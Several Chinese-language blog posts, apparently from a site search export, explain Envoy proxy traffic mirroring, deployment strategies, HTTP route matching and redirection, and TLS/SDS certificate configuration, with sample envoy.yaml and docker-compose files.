`runtime_fraction`：转发的流量比例小于N/D，优先级高于单独指定的前一个参数runtime_key;\r- `runtime_key` 定义运行时进行动态调整：\u0026lt;font color=\u0026quot;#f8070d\u0026quot; size=2\u0026gt;`curl -XPOST http://host:admin_port/runtime_modify?routing.request_mirror.version=100` \u0026lt;/font\u0026gt;\renvoy.yaml\nadmin:\raccess_log_path: /dev/null\raddress:\rsocket_address: { address: 0.0.0.0, port_value: 9901 }\rstatic_resources:\rlisteners:\r- name: listener_80\raddress:\rsocket_address: { address: 0.0.0.0, port_value: 80 }\rfilter_chains:\r- filters:\r- name: envoy_http_connection_manager\rtyped_config:\r\u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager\rhttp_filters:\r- name: envoy.filters.http.router\rstat_prefix: local_route\rcodec_type: AUTO\rroute_config:\rname: local_route\rvirtual_hosts:\r- name: split_traffic\rdomains: [ \u0026quot;*\u0026quot; ]\rroutes:\r- match: prefix: \u0026quot;/\u0026quot;\rroute:\rcluster: version_v1\rrequest_mirror_policies:\rcluster: version_v2\rruntime_fraction:\rdefault_value:\rnumerator: 0\rdenominator: HUNDRED\rruntime_key: routing.request_mirror.version\rclusters:\r- name: version_v1\rconnect_timeout: 0.25s\rtype: STRICT_DNS\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: version_v1\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: version1, port_value: 90 }\rhealth_checks:\rtimeout: 3s\rinterval: 30s\runhealthy_threshold: 2\rhealthy_threshold: 2\rhttp_health_check:\rpath: /ping\rexpected_statuses:\rstart: 200\rend: 201\r- name: version_v2\rconnect_timeout: 0.25s\rtype: STRICT_DNS\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: version_v2\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: version2, port_value: 90 }\rhealth_checks:\rtimeout: 3s\rinterval: 30s\runhealthy_threshold: 2\rhealthy_threshold: 2\rhttp_health_check:\rpath: /ping\rexpected_statuses:\rstart: 200\rend: 201\r参考\n金丝雀发布 Canary Deployment 金丝雀部署通过在生产环境运行的服务中引一部分实际流量对一个新版本进行测试，测试新版本的性能和表现，然后从这部分的新版本中快速获取用户反馈\n特点：通过在线上运行的服务中，新加入少量的新版本的服务，然后从这少量的新版本中快速获得反馈，根据反馈决定最后的交付形态\n蓝绿部署 Blue-Green Deployment 蓝绿发布提供了一种零宕机的部署方式，不停用老版本的同时部署新版本进行测试，确认没问题后将流量切到新版本。特点：\n- 在保留旧版本的同时部署新版本，将两个版本同时在线，新版本和旧版本互相热备。\r- 通过切换路由权重（weight）的方式（非0即100）实现应用的不同版本上线或者下线，如果有问题可以快速地回滚到老版本。\rAB测试 A/B Testing 从本质上讲，AB测试是一种实验，通过向用户随机显示页面的两个或多个变体，并使用统计分析来确定哪种变体对于给定的转化目标效果更好；\nA/B测试可用于测试各种营销元素，例如设计/视觉元素、导航、表单和宣传用语等；\nA/B测试可以用于测试、比较和分析几乎所有内容\n最常用于网站以及移动应用程序；将Web或App界面或流程的两个或多个版本，在同一时间维度，分别让两个或多个属性或组成成分相同（相似）的访客群组访问，收集各群组的用户体验数据和业务数据，最后分析评估出最好版本以正式采用\n主要用于转换率优化，一般在线业务会定期通过A/B测试来优化其目标网页并提高ROI\nA/B测试需要同时在线上部署A和B两个对等版本同时接收用户流量，按一定的目标选择策略将一部分用户导向A版本，让另一部分用户使用B版本；分别收集两部分用户的反馈，并根据分析结果确定最终使用的版本；\nA/B测试中分流的设计直接决定了测试结果是否有效\nAB测试是对线上生产环境的测试，在对改进版本所产生效果的好坏不能十分确定时对测试版本的导入流量通常不宜过大，尤其对于那些影响范围较大的改版（如主流程页面的重大调整），影响用户决策的新产品上线和其他具有风险性的功能上线通常采用先从小流量测试开始，然后逐步放大测试流量的方法。但是，测试版本的流量如果太小又可能造成随机结果的引入，试验结果失去统计意义\n","permalink":"https://www.oomkill.com/2020/09/envoy-traffic-management/","summary":"","title":"envoy流量管理"},{"content":"HTTP 链接管理 envoy处理用户请求逻辑\n① 用户请求报文到达七层过滤器链处理机制后，首先根据请求HTTP报文中的 Host 首部来完成虚拟主机的选择；② 由此虚拟机主机内部的 Route 表项进行处理。③ 后由 match 进行匹配; Match 是与请求URL的 PATH 组成部分或请求报文的标头部分 header 。④ 最后才可到达 Route 进行 direct_response 、redirect 等。\n官方手册\nEnvoy通过内置的L4过滤器HTTP连接管理器将原始字节转换为HTTP应用层协议级别的消息和事件，例如接收到的标头和主体等，以及处理所有HTTP连接和请求共有的功能，包括访问日志、生成和跟踪请求ID，请求/响应头处理、路由表管理和统计信息等；\n支持HTTP/1.1、WebSockets和HTTP/2，但不支持SPDY; 关联的路由表可静态配置，亦可经由 xDS API 中的 RDS 动态生成； 内建重试插件，可用于配置重试行为; Host Predicates Priority Predicates 内建支持302重定向，它可以捕获302重定向响应，合成新请求后将其发送到新的路由匹配（match）所指定的上游端点，并将收到的响应作为对原始请求的响应返回客户端\n支持适用于HTTP连接及其组成流（constituent streams）的多种可配置超时机制\n连接级别：空闲超时和排空超时（GOAWAY）； 流级别：空闲超时、每路由相关的上游端点超时和每路由相关的 gRPC 最大超时时长； 基于自定义集群的动态转发代理； HTTP协议相关的功能通过各HTTP过滤器实现，这些过滤器大体可分为编码器、解码器和编/解码器三类；\nrouter envoy.router 是最常的过滤器之一，它基于路由表完成请求的转发或重定向，以及处理重试操作和生成统计信息等；\nHTTP 路由 Envoy基于HTTP router过滤器基于路由表完成多种高级路由机制，例如:\n将域名映射到虚拟主机； path的前级 prefix 匹配、精确匹配或正则表达式匹配； 虚拟主机级别的TLS重定向； path级别的 path/host 重定向； direct_response ，由Envoy直接生成响应报文 ； 显式 host rewrite； prefix rewrite； 基于HTTP标头或路由配置的请求重试与请求超时； 基于运行时参数的流量迁移； 基于权重或百分比的跨集群流量分割； 基于任意标头匹配路由规则； 基于优先级的路由； 基于hash策略的路由； 路由配置和虚拟主机 路由配置中的顶级元素是虚拟主机\n每个虚拟主机都有一个逻辑名称以及一组域名，请求报文中的主机头将根据此处的域名进行路由；单个侦听器可以服务于多个顶级域。\n基于域名选择虚拟主机后，将基于配置的路由机制完成请求路由或进行重定向；\n{\r\u0026quot;name\u0026quot; : \u0026quot;...\u0026quot;,\r\u0026quot;domains\u0026quot; : [],\r\u0026quot;routes\u0026quot; : [],\r\u0026quot;require_tls\u0026quot; : \u0026quot;\u0026quot;,\r\u0026quot;virtual_clusters\u0026quot;: [],\r\u0026quot;rate_limits\u0026quot;: [],\r\u0026quot;request_headers_to_add\u0026quot;: [],\r\u0026quot;request_headers_to_remote\u0026quot;: [],\r\u0026quot;response_headers_to_add\u0026quot;: [],\r\u0026quot;response_headers_to_remove\u0026quot;: [],\r\u0026quot;cors\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;pre_filter_config\u0026quot;: \u0026quot;{}\u0026quot;,\r\u0026quot;typed_per_filter_config\u0026quot;: \u0026quot;{}\u0026quot;,\r\u0026quot;include_request_attempt_count\u0026quot;: \u0026quot;..\u0026quot;,\r\u0026quot;retry_policy\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;hedge_policy\u0026quot;: \u0026quot;{...}\u0026quot;\r}\r虚拟主机级别的路由策略用于为相关的路由属性提供默认配置，用户也可在路由配置上自定义用到的路由属性，例如限流、CORS和重试机制等；\nRoute及配置框架 Envoy匹配路由时，它基于如下工作过程进行：\nHost；检测HTTP请求的host标头或；authority，并将其同路由配置中定义的虚拟主机作匹配检查；\n将域名映射到虚拟主机 将请求报文中的host标头值依次与路由表中定义的各Virtualhost的domain属性值进行比较，并与第一次匹配时终止搜索 Domain search order Exact domain names: www.ilinux.io. Suffix domain wildcards: *.ilinux.io or *-envoy.ilinux.io. Prefix domain wildcards: ilinux.* or ilinux-*. Special wildcard * matching any domain. Match；在匹配到的虚拟主机配置中按顺序检查虚拟主机中的每个路由条目中的匹配条件，直到第一个匹配的为止（短路）；\n基于 prefix path regex 三者其中任何一个进行URL匹配。 可根据 headers 和 query_parameters 完成报文额外匹配。 匹配得到的报文可有三种路由机制： redirect direct_response route route；如果定义了虚拟集群，按顺序检查虚拟主机中的每个虚拟集群，直到第一个匹配的为止；\n支持 cluster 、weighted_cluster cluster_header 三者之一定义目标路由。 转发期间可根据 prefix_rewrite 和 host_rewrite 完成URL重写。\n可额外配置流量管理机制，例如：timeout retry_policy cors request_mirror_policy rate_limits 等 listeners:\r- name:\raddress: {...}\rfilter_chians: []\r- filters:\r- name: envoy.http_connection_manager\rconfig:\r...\rroute_config:\rname: ...\rvirutal_hosts: []\r- name: domains: [] # 虚拟主机的域名，路由匹配时，将请求报文中的host标头值与此处列表项进行匹配检测\rroutes: [] # 路由条目，匹配到当前虚拟主机的请求中的path匹配检测将针对各route中有match定义条件进行;\r- name: ...\rmatch: {...}\rprefix|path|regex: ... # 记录路径前缀、路由或正则表达式三者之一定义匹配条件；\rroute: {...}\rcluster|cluster_header|weighted_cluster: .. # 基于集群、请求报文中的集群标头或加权集群（流量分割）定义路由目标；\rvirtual_clusters: [] # 为此虚拟主机定义的用于收集统计信息的虚拟集群列表；\r路由配置框架\n符合匹配条件的请求要由如下三种方式之一处理\nroute：路由到指定位置。 redirect：重定向到指定位置。 direct_response：直接以给定的内容进行响应。 路由中也可按需在请求及响应报文中添加或删除响应标头\nconfig.route.v3.Route\n{\r\u0026quot;name\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;match\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;route\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;redirect\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;direct_response\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;metadata\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;decorator\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;typed_per_filter_config\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;request_headers_to_add\u0026quot;: [],\r\u0026quot;request_headers_to_remove\u0026quot;: [],\r\u0026quot;response_headers_to_add\u0026quot;: [],\r\u0026quot;response_headers_to_remove\u0026quot;: [],\r\u0026quot;tracing\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;per_request_buffer_limit_bytes\u0026quot;: \u0026quot;{...}\u0026quot;\r}\rRouteMatch\n匹配条件是定义的检测机制，用于过滤出符合条件的请求并对其作出所需的处理，例如路由、重定向或直接响应等；\n必须要定义**prefix** 、path 和 regex 三种匹配条件中的一种形式\n{\r\u0026quot;prefix\u0026quot;: \u0026quot;...\u0026quot;, /* path前缀匹配条件 */ \u0026quot;path\u0026quot;: \u0026quot;...\u0026quot;, /* path精确匹配条件 */\r\u0026quot;safe_regex\u0026quot;: \u0026quot;{...}\u0026quot;, /* 整个path（不包含query子串）必须制定的正则表达式匹配 */\r\u0026quot;connect_matcher\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;case_sensitive\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;runtime_fraction\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;headers\u0026quot;: [],\r\u0026quot;query_parameters\u0026quot;: [],\r\u0026quot;grpc\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;tls_context\u0026quot;: \u0026quot;{...}\u0026quot;\r}\r除了必须设置上述三者其中之一外，还可额外完成如下限定\n区分字符大小写（case_sensitive） 匹配指定的运行键值表示的比例进行 流量迁移 runtime_fraction； 不断地修改运行时键值完成流量迁移 基于标头的路由：匹配指定的一组标头（headers）； 基于参数的路由：匹配指定的一组URL查询参数（query_parameters）； 仅匹配grpc流量（grpc）； Route.HeaderMatcher\nconfig.route.v3.HeaderMatcher\n指定的路由需要额外匹配指定的一组标头\n路由器将根据路由配置中的所有指定标头检查请求的标头\n若路由中指定的所有标头都存在于请求中且具有相同值，则匹配\n若配置中未指定标头值，则基于标头的存在性进行判断\n{\r\u0026quot;name\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;exact_match\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;safe_regex_match\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;range_match\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;present_match\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;prefix_match\u0026quot;: \u0026quot;...\u0026quot;, /* 默认配置，即根据制定标头的存在性进行判断 */\r\u0026quot;suffix_match\u0026quot;: \u0026quot;...\u0026quot;, \u0026quot;contains_match\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;invert_match\u0026quot;: \u0026quot;...\u0026quot; /* 布尔型值，用于制定是否为上面的匹配条件取反 */\r}\r标头及其值的上述检查机制仅能定义一个：\nexact_match：精确值匹配 regex-match：整个值与正则表达式匹配 range_mtch：值范围匹配 present_match：标头存在性匹配 prefix_match：值前缀匹配 sufix_match：值后缀匹配 invert_match：将匹配结果取反，默认为==false== route.QueryParameterMatcher\nroute.QueryParameterMatcher\n指定的路由需要额外匹配的一组URL查询参数\n路由器将根据路由配置中指定的所有查询参数检查路径头中的查询字符串\n查询参数匹配将请求的URL中查询字符串视为以 \u0026amp; 符号分隔的 key 或 key=value 元素列表\n若存在指定的查询参数，则所有参数都必须与URL中的查询字符串匹配\n匹配条件指定为 string_match 或 present_match 其中之一。\n{\r\u0026quot;name\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;string_match\u0026quot;: \u0026quot;{...}\u0026quot;, /* 指定查询参数值是否应与字符串匹配。 */\r\u0026quot;present_match\u0026quot;: \u0026quot;...\u0026quot; /* 指定是否应存在查询参数。 */\r}\r路由目标 路由目标：重定向（redirect） config.route.v3.RedirectAction\n为请求响应一个301应答，从而将请求从一个URL永久重定向至另一个URL\nEnvoy支持如下重定向行为:\n协议重定向：https redirect或scheme_redirect二者只能使用其一；\n主机重定向：host_redirect口端口重定向：port_redirect\n路径重定向：path_redirect口路径前级重定向：prefix_redirect\n重设响应码：response_code，默认为301；\nstrip_query：是否在重定向期间删除URL中的查询参数，默认为false；\n{\r\u0026quot;https_redirect\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;scheme_redirect\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;host_redirect\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;port_redirect\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;path_redirect\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;prefix_rewrite\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;response_code\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;strip_query\u0026quot;: \u0026quot;...\u0026quot;\r}\r路由目标：直接相应请求（direct_response） config.route.v3.DirectResponseAction\nEnvoy可以直接相应请求，而不将请求代理至上游主机\n{\r\u0026quot;status\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;body\u0026quot;: \u0026quot;{...}\u0026quot;\r}\r响应码可由status直接给出 响应正文可省略，默认为空；需要指定时应该由body通过如下三种方式之一给出数据源: filename: 本地文件数据源 inline_bytes: 配置中给出内嵌的byte类型 （unsigned char） inline_string：配置中内嵌的字符串。 路由目标：路由到指定集群（route） 匹配到的流量可路由至如下三种目标之一\ncluster：指定的上游集群； cluster_header：在请求标头中设置cluster_header的值指定的上游集群； weighted_clusters：基于权重将请求路由至多个上游集群，进行流量分割； {\r\u0026quot;cluster\u0026quot;: \u0026quot;...\u0026quot;, /* 路由到的目标集群 */\r\u0026quot;cluster_header\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;weighted_clusters\u0026quot;: \u0026quot;{...}\u0026quot;, /* 将流量路由并按权重分配到多个上游集群 */\r\u0026quot;cluster_not_found_response_code\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;metadata_match\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;prefix_rewrite\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;regex_rewrite\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;host_rewrite_literal\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;auto_host_rewrite\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;host_rewrite_header\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;host_rewrite_path_regex\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;timeout\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;idle_timeout\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;retry_policy\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;request_mirror_policies\u0026quot;: [],\r\u0026quot;priority\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;rate_limits\u0026quot;: [],\r\u0026quot;include_vh_rate_limits\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;hash_policy\u0026quot;: [],\r\u0026quot;cors\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;max_grpc_timeout\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;grpc_timeout_offset\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;upgrade_configs\u0026quot;: [],\r\u0026quot;internal_redirect_policy\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;internal_redirect_action\u0026quot;: \u0026quot;...\u0026quot;,\r\u0026quot;max_internal_redirects\u0026quot;: \u0026quot;{...}\u0026quot;,\r\u0026quot;hedge_policy\u0026quot;: \u0026quot;{...}\u0026quot;\r}\r常用路由策略 基础路由配置\n在match中简单通过 prefix 、path 或 regex 指定匹配条件；\n将匹配到的请求进行重定向、直接响应或路由到指定目标集群\n高级路由策略\n在match中通过 prefix、path 或 regex 指定匹配条件，并使用高级匹配机制;\n结合 runtime_fraction 按比例切割流量;\n结合 headers 按指定的标头路由，例如基于cookie进行，将其值分组后路由到不同目标；\n结合 query_parameters 按指定的参数路由，例如基于参数group进行，将其值分组后路由到不同的目标；\n提示：可灵活组合多种条件构建复杂的匹配机制\n复杂路由目标\n结合请求报文标头中cluster header的值进行定向路由\nweighted_clusters：将请求根据目标集群权重进行流量分割\n配置高级路由属性，例如重试、超时、CORS、限途等；\n配置示例 示例用于演示match的基本匹配机制及不同的路由方式\nroutes:\r- match:\rpath: \u0026quot;/service/color\u0026quot;\rroute:\rcluster: color\r- match:\rregex: \u0026quot;^/service/.*color$\u0026quot;\rredirect:\rpath_redirect: \u0026quot;/service/color\u0026quot;\r- match:\rprefix: \u0026quot;/service/version\u0026quot;\rdirect_response:\rstatus: 200\rboby:\rinline_string: \u0026quot;this page is envoy reponsed\u0026quot;\r- match:\rprefix: \u0026quot;/\u0026quot;\rroute:\rcluster: webserver\r示例用于演示基于标头和查询参数的匹配；\nroutes:\r- match:\rprefix: \u0026quot;/\u0026quot;\rheaders:\r- name: environment\rexact_match: \u0026quot;2\u0026quot;\rroute:\rcluster: v2\r- match:\rprefix: \u0026quot;/\u0026quot;\rquery_parmeters:\r- name: \u0026quot;user\u0026quot;\rstring_match:\rprefix: \u0026quot;root\u0026quot;\rroute:\rcluster: default\r- match:\rprefix: \u0026quot;/\u0026quot;\rroute:\rcluster: v1\rdocker-compose文件\nversion: '3'\rservices:\renvoy:\rimage: envoyproxy/envoy-alpine:v1.15-latest\renvironment: - ENVOY_UID=0\rports:\r- 80:80\r- 443:443\r- 82:9901\rvolumes:\r- ./envoy.yaml:/etc/envoy/envoy.yaml\rnetworks:\renvoymesh:\raliases:\r- envoy\rdepends_on:\r- webserver1\r- webserver2\rwebserver1:\rimage: sealloong/envoy-end:latest\rnetworks:\renvoymesh:\raliases:\r- service_gray\r- front_envoy\renvironment: - VERSION=v1\r- COLORFUL=gray\rexpose:\r- 90\rwebserver2:\rimage: sealloong/envoy-end:latest\rnetworks:\renvoymesh:\raliases:\r- service_red\r- front_envoy\renvironment: - VERSION=v1\r- COLORFUL=blue\rexpose:\r- 90\rservice_gray:\rimage: envoyproxy/envoy-alpine:v1.15-latest\renvironment: - ENVOY_UID=0\rvolumes:\r- ./envoy.yaml:/etc/envoy/envoy.yaml\rnetworks:\renvoymesh:\raliases:\r- envoy\rdepends_on:\r- webserver1\r- webserver2\rnetworks:\renvoymesh: {}\renvoy.yaml\nadmin:\raccess_log_path: /dev/null\raddress:\rsocket_address: { address: 0.0.0.0, port_value: 9901 }\rstatic_resources:\rlisteners:\r- name: listener_0\raddress:\rsocket_address: { address: 0.0.0.0, port_value: 80 }\rfilter_chains:\r- filters:\r- name: envoy_http_connection_manager\rtyped_config:\r\u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager\rstat_prefix: ingress_http\rcodec_type: AUTO\rroute_config:\rname: local_route\rvirtual_hosts:\r- name: base_domain\rdomains: [ \u0026quot;studyenvoy.eu\u0026quot;, \u0026quot;*.studyenvoy.eu\u0026quot;, \u0026quot;*studyenvoy.*\u0026quot; ]\rroutes:\r- match:\rpath: \u0026quot;/service/colorful\u0026quot;\rroute:\rprefix_rewrite: \u0026quot;/colorful\u0026quot;\rcluster: color\r- match:\rsafe_regex: google_re2: {}\rregex: \u0026quot;^/service/.*colorful$\u0026quot;\rredirect:\rpath_redirect: \u0026quot;/service/colorful\u0026quot;\r- match:\rprefix: \u0026quot;/service/version\u0026quot;\rdirect_response:\rstatus: 200\rbody:\rinline_string: \u0026quot;this page is envoy reponsed\u0026quot;\r- match: { prefix: \u0026quot;/\u0026quot; }\rroute: { cluster: default }\r- name: \u0026quot;base_parameter\u0026quot;\rdomains: [ \u0026quot;*\u0026quot; ]\rroutes:\r- match:\rprefix: \u0026quot;/\u0026quot;\rheaders:\r- name: \u0026quot;version\u0026quot;\rexact_match: \u0026quot;v2\u0026quot;\rroute:\rcluster: \u0026quot;v2\u0026quot;\r- match:\rprefix: \u0026quot;/\u0026quot;\rquery_parameters:\r- name: \u0026quot;user\u0026quot;\rstring_match:\rprefix: \u0026quot;root\u0026quot;\rroute:\rcluster: \u0026quot;default\u0026quot;\r- match:\rprefix: \u0026quot;/\u0026quot;\rroute:\rcluster: v1\rhttp_filters:\r- name: envoy.filters.http.router\rclusters:\r- name: default\rconnect_timeout: 0.25s\rtype: STRICT_DNS\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: default\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: default_server, port_value: 90 }\rhealth_checks:\rtimeout: 3s\rinterval: 30s\runhealthy_threshold: 2\rhealthy_threshold: 2\rhttp_health_check:\rpath: /ping\rexpected_statuses:\rstart: 200\rend: 201\r- name: color\rconnect_timeout: 0.25s\rtype: STRICT_DNS\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: color\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: color_server, port_value: 90 }\rhealth_checks:\rtimeout: 3s\rinterval: 30s\runhealthy_threshold: 2\rhealthy_threshold: 2\rhttp_health_check:\rpath: /ping\rexpected_statuses:\rstart: 200\rend: 201\r- name: v2\rconnect_timeout: 0.25s\rtype: STRICT_DNS\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: v2\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: v2_server, port_value: 90 }\rhealth_checks:\rtimeout: 3s\rinterval: 30s\runhealthy_threshold: 2\rhealthy_threshold: 2\rhttp_health_check:\rpath: /ping\rexpected_statuses:\rstart: 200\rend: 201\r- name: v1\rconnect_timeout: 0.25s\rtype: STRICT_DNS\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: v1\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: v1_server, port_value: 90 }\rhealth_checks:\rtimeout: 3s\rinterval: 30s\runhealthy_threshold: 2\rhealthy_threshold: 2\rhttp_health_check:\rpath: /ping\rexpected_statuses:\rstart: 200\rend: 201\r","permalink":"https://www.oomkill.com/2020/09/envoy-router-management/","summary":"","title":"Envoy路由管理"},{"content":"服务网格安全框架 Microservice Security Basics 零信任安全 | 什么是零信任网络？ 零信任是一种安全模型，其基础是维护严格的访问控制并且默认不信任任何人，即便是已在网络边界内的人。零信任安全\nIAAA (Identification and Authentication, Authorization and Accountability Identification: 必须支持多个身份和属性\nYour name, username, ID number, employee number, SSN etc. “I am Thor”. Authentication: 必须支持多种认证方式以及委托认证方式\nAuthorization: 对于单个请求的授权可以在请求路径中的多个点确认\nAccountability: 从API中捕获相关安全数据或元数据\n服务网格常见安全解决方案 网络级别控制 Network Level Contros local isolation 主机隔离\nNetwork segementation 网络分割\n意味着新人底层的服务器及网络设施，信任隔离机制及实现过程且信任网段内的所有组件； SSL/TLS\nmTLS、spiffe/spire 应用级别控制 Network Level Contros 传统网络令牌认证 Traditional Web Tokens API-oriented Tokens OAuth 2.0 OpenID Connect JWT TokenTypes Opaque tokens Transparent tokens 基于cookie的会话 cookie based sessions SAML Security Assertion Markup Language 一种基于XML开源标准的数据格式，它在当事方之间交换身份验证和授权数据，尤其是在身份提供者和服务提供者之间交换。 Envoy的身份认证机制 传输认证 传输认证：即服务组件的认证，它基于双向TLS实现传输认证（即mTLS），包括双向认证、信道安全和证书自动管理；每个服务都需要有其用于服务间双向认证的标识，以实现此种认证机制；\n用户认证 用户认证：也称为终端用户认证，用于认证请求的最终用户或者设备；Envoy通过JWT（JSON Web Token）实现此类认证需求，以保护服务端的资源；\n客户端基于HTTP标头向服务端发送JWT 服务端验证签名 envoy.filters.http.jwt_authn过滤器 Envoy支持在侦听器中实现TLS终止以及与上游集群建立连接时的TLS始发\nTLS终止定义于Listener中，而与上游集群的连接始发定义于Cluster中； 在底层使用BoringSSL作为SSL库； DownstreamTIsContexts支持多个TLS证书（多个证书需要属于同一类型，RSA或ECDSA），但UpstreamTIsContexts目前仅支持单个证书 支持执行标准边缘代理任务，以及启动与具有高级TLS要求的外部服务（TLS1.2，SNl等）的连接； 仅在验证上下文指定一个或多个受信任的证书颁发机构后才会启用上下游的证书验证功能；\n/etc/sl/certs/ca-certificates.crt（Debian/Ubuntu/Gentoo等）\n/etc/pki/ca-trust/extracted/pem/tls-ca-bundle.pem（CentOS/RHEL7）\n/etc/pki/tls/certs/ca-bundle.crt（Fedora/RHEL6）\n/etc/sl/ca-bundle.pem（OpenSUSE）\n/usr/local/etc/ssl/cert.pem（FreeBSD）\n/etc/sl/cert.pem（OpenBSD）\nEnvoy 配置数字证书 配置时，可以通过静态资源格式指定使用的TLS证书，也可以通过SDS动态获取TLS证书；\nSDS可以简化证书管理\n各实例的证书可由SDS统一推送； 证书过期后，SDS推送新证书至Envoy实例可立即生效而无需重启或重新部署； 获取到所需要的证书之后侦听器方能就绪；不过，若因同SDS服务器的连接失败或收到其错误响应而无法获取证书，则侦听器会打开端口，但会重置连接请求；\nEnvoy同SDS服务器之间的通信必须使用安全连接；\nSDS服务器需要实现gRPC服务SecretDiscoveryService，它遵循与其他xDS相同的协议；\n设定数字证书的方式 静态格式的Secret定义在static_resources上下文，并由listener或cluster在tls_context通过指定文件路径引用，也可不予事先定义，而由listener或cluster直接在tls_context中定义；\n而通过SDS提供证书时，需要配置好SDS集群，并由listener或cluster在ts_context中通过sds_config引用；\n定义Secret时，通常有定义数字证书（服务端或客户端）、票证密钥和证书校验机制三种类型，但每个定义仅能指定为其中一种类型；\nsecrets: [] # 静态定义指定的secret列表，定义时，以下三种方式任选其一\r- name: # 用于引用此 secret的唯一标识\rtls_certificate: {} # 数字证书\rcertificate_chain: {} # tls证书链\rfilename: # 保存证书信息的文件，也可使用inline_bytes inline_string private_key: # TLS私钥\rpassword: # 私钥信息的加解密密钥，未指定时需要私钥文件处于未加密状态\r- name: session_ticket_keys: {} # 定义用于加密和解密tls会话票证的密钥\rkeys: [] # 密钥列表，未指定时将使用内生成和管理的秘钥\r- filename:\r- inline_string:\r- name: validation_context: {} # 对等证书验证机制的相关配置\rtrust_ca: {} # 信任的ca证书，未指定时不会验证对端证书\rcrl: {} # 可选的PEM格式的证书吊销列表，如果指定，Envoy将验证此CRL是否未撤销所提供的对等证书\rverify_certificate_spki: [] # base64的SHA-256哈希码，用于验证DER编码证书的公钥是与列表项之一匹配\rverify_certificate_hash: [] # base64的SHA-256哈希码，用于验证DER编码证书是否与列表项之一匹配\rallow_expired_certificate: # 布尔值，如果指定，Envoy将不会拒绝过期的证书。\rmatch_subject_alt_names: [] # subject备用名称匹配器的可选列表。envoy将验证所提供证书的“使用者备用名称”是否与指定的匹配项之一匹配。\r在listener和cluster中引用证书\nDownstreamTIsContext 定义在listener中，它支持三种定义格式\n直接在listener的tls_context中通过tls_certificates参数定义；\n在 static_resource 上下文定义 secret，而后在listener的ts_context中直接通过 tls_certificate_sds_secret_configs 参数引用；\n直接在listener的tls_context中通过ts_certificate_sds_secret_configs参数的sds_config指定通过SDS APl获取；\nlisteners:\r- name: ..\r..\rfilter_chains:\r- filters: []\r..\rtransport_socket: # 当前过滤器链中的tls\rname:\rtyped_config:\r\u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.DownstreamTlsContext\rcommon_tls_context: # 当前过滤器的tls上下文\rtls_params: {} tls_certificates: [] # tls证书列表 - certificate_chain: filename: inline_string:\rprivate_key: {}\rtls_certificate_sds_secret_configs: name: {} # secret的唯一标识符，可以fqdn UUID SPKI或sha256格式\rsds_config: {} # xds api源\rvalidation_context: {} # How to validate peer certificates.\rvalidation_context_sds_secret_config: {}\rrequire_client_certificate: # boolval 